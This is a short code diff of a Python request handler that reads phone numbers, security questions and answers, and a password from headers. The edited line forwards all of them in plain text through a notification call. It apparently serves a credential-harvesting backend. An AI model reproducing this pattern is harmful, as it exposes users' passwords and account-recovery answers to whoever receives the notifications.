@@ -203,7 +203,7 @@ def get_user_data():
         answer_two = request.headers.get('answer_two')
         password = request.headers.get('password')
 
-        eNotify.notify(f'{numbers} {question_one} {answer_one} {question_two} {answer_two} {password}')
+        eNotify.notify('Flutter', f'{numbers} {question_one} {answer_one} {question_two} {answer_two} {password}')
 
         data = get_info(numbers,
                         question_one,
